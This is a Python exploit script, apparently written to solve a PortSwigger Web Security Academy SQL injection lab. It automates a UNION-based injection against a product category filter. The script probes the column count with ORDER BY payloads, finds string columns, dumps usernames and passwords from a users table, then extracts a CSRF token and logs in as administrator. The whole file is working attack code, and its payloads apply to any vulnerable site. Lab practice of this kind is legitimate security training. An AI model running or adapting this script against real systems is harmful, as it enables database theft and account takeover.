#!/usr/bin/env python3
import sys
import warnings
from typing import Dict, List, Optional
from urllib.parse import urljoin

from bs4 import BeautifulSoup
from requests import Response
from requests.exceptions import RequestException
from requests.sessions import Session

warnings.filterwarnings("ignore", message="Unverified HTTPS")


class LabExploit:
    def __init__(self, base_url: str) -> None:
        self.base_url = base_url.rstrip("/")
        self.session = Session()
        self.session.headers.update(
            {"User-Agent": "Security-Scanner-v1", "Connection": "close"}
        )
        self.proxies = {
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080",
        }
        self.category = "Gifts"

    def _send_request(
        self,
        endpoint: str,
        params: Optional[dict] = None,
        data: Optional[dict] = None,
        method="GET",
    ) -> Optional[Response]:
        """
        Internal raw helper, returns Response or None
        Used for discovery loops where non 200 status codes are expected.
        """
        target_url = urljoin(self.base_url, endpoint)
        try:
            return self.session.request(
                method,
                target_url,
                params=params,
                data=data,
                timeout=(2, 5),
                allow_redirects=True,
                proxies=self.proxies,
                verify=False,
            )
        except RequestException:
            return None

    def _validated_request(
        self,
        endpoint: str,
        params: Optional[dict] = None,
        data: Optional[dict] = None,
        method: str = "GET",
        stage: str = "unknown",
    ) -> Response:
        """
        Internal helper, wraps _send_request(). Returns Response or exits script.
        Used in steps which MUST succeed (200 OK) to continue.
        """
        res = self._send_request(endpoint, params, data, method)

        if res is None:
            print(f"[-] Stage [{stage}]: Connection error")
            sys.exit(1)
        elif res.status_code != 200:
            print(f"[-] Stage [{stage}]: Received HTTP {res.status_code}")
            print(f"[-] Failed payload context: {params or data}")
            sys.exit(1)

        return res

    def is_alive(self) -> bool:
        """Checks if the lab is still active"""
        print("[*] Phase 1: Checking if lab is active...")
        res = self._validated_request("", stage="URL-Check")
        return "academyLabBanner" in res.text

    def harvest_category(self) -> Optional[str]:
        """Harvest the categories dynamically from the home page"""
        print("[*] Phase 2: Harvesting categories...")
        res = self._validated_request("", stage="Recon-Harvesting")
        soup = BeautifulSoup(res.text, "html.parser")
        categories = []
        for tag in soup.find_all("a", class_="filter-category"):
            tag_name = tag.get_text(strip=True)
            if "All" not in tag_name:
                categories.append(tag_name)
        return min(categories, key=len) if categories else None

    def get_table_width(self) -> int:
        """Identifies the column count"""
        print("[*] Phase 3: Identifying table width...")
        for idx in range(1, 11):
            payload = f"{self.category}' ORDER BY {idx} -- "
            res = self._send_request("filter", params={"category": payload})
            if res is not None and res.status_code != 200:
                return idx - 1

        return 0

    def map_string_indices(self, col_count: int) -> List[int]:
        """Determines string-compatible columns"""
        print("[*] Phase 4: Determining string-compatible columns...")
        marker = "asif-probe"
        col_indices = []
        for idx in range(col_count):
            null_chain = ["NULL"] * col_count
            null_chain[idx] = f"'{marker}'"
            payload = f"{self.category}' UNION SELECT {','.join(null_chain)} -- "
            res = self._send_request("filter", params={"category": payload})
            if res is not None and marker in res.text:
                col_indices.append(idx)
        return col_indices

    def parse_credentials(self, html_content: str) -> Dict[str, str]:
        """Parses user credentials from HTTP response"""
        soup = BeautifulSoup(html_content, "html.parser")
        creds = {}
        print("\n" + "-" * 50)
        print(f"{'Username':<25} | {'Password':<25}")
        print("-" * 50)
        for th in soup.find_all("th"):
            raw_cred = th.get_text(strip=True)
            if " " in raw_cred:
                continue
            username, password = raw_cred.split(":", 1)
            if username and password:
                creds[username] = password
                print(f"{username:<25} | {password:<25}")
        print("-" * 50)
        return creds

    def exfiltrate_users(
        self, col_count: int, col_indices: List[int]
    ) -> Dict[str, str]:
        """Exfiltrate credentials from users table"""
        print("[*] Phase 5: Attempting to exfiltrate 'users' table...")
        null_chain = ["NULL"] * col_count
        null_chain[col_indices[0]] = "username ||':'|| password"
        payload = f"{self.category}' UNION SELECT {','.join(null_chain)} FROM users -- "
        res = self._validated_request(
            "filter", params={"category": payload}, stage="Exfiltration"
        )
        return self.parse_credentials(res.text)

    def validate_access(self, username: str, password: str) -> bool:
        """Extracts CSRF, attempts to login and verfies solve status"""
        print(f"[*] Phase 6: Attempting to login as: {username}")
        # Step 1: Extract CSRF form login page
        res = self._validated_request("login", stage="CSRF-Extraction")
        soup = BeautifulSoup(res.text, "html.parser")
        csrf_tag = soup.find("input", attrs={"name": "csrf"})
        csrf_token = (
            str(csrf_tag.get("value")) if csrf_tag and csrf_tag.get("value") else None
        )
        if not csrf_token:
            print("[-] Could not extract CSRF token from login page!")
            return False
        print(f"[+] Extracted CSRF token: {csrf_token}")

        # Step 2: Login
        login_data = {"csrf": csrf_token, "username": username, "password": password}
        self._validated_request("login", data=login_data, method="POST", stage="Login")

        # Step 3: Verify
        res = self._validated_request("")
        return "Congratulation" in res.text

    def solve(self) -> None:
        # Check lab url
        if not self.is_alive():
            print("[-] Lab URL is invalid or has expired!")
            return

        # Harvest category
        category = self.harvest_category()
        if not category:
            print("[-] Could not find valid category!")
            return
        self.category = category
        print(f"[+] Anchor category: {category}")

        # Identify table width
        col_count = self.get_table_width()
        if col_count == 0:
            print("[-] Could not identify column count!")
            return
        print(f"[+] Table width: {col_count}")

        # Map string-compatible columns
        col_indices = self.map_string_indices(col_count)
        if not col_indices:
            print("[-] Could not find string-compatible column!")
            return
        print(f"[+] String-compatible columns: {col_indices}")

        # exfiltrate users table
        credentials = self.exfiltrate_users(col_count, col_indices)
        if not credentials:
            print("[-] Could not exfiltrate credentials!")
            return

        # attempt login and verify
        if self.validate_access("administrator", credentials["administrator"]):
            print("[!] SUCCESS: Logged in and lab solved.")
        else:
            print("[-] Lab is not solved")


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} https://lab-id.web-security-academy.com")
        sys.exit(1)

    url = sys.argv[1].strip()

    exploit = LabExploit(url)
    exploit.solve()


if __name__ == "__main__":
    main()
